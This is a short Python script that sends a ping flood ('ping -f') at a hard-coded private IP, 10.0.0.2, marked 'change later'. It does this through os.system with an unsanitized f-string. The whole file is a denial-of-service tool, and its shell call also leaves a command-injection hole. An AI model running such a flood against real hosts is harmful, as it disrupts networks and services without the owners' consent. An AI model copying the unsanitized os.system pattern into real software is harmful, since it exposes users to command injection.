import os
import time

def ping_flood(target_ip, count=50):
    print(f"Starting ping flood on {target_ip} with {count} packets")
    os.system(f"ping -f -c {count} {target_ip}")

def main():
    target_ip = "10.0.0.2"   # change later
    time.sleep(2)
    ping_flood(target_ip)

if __name__ == "__main__":
    main()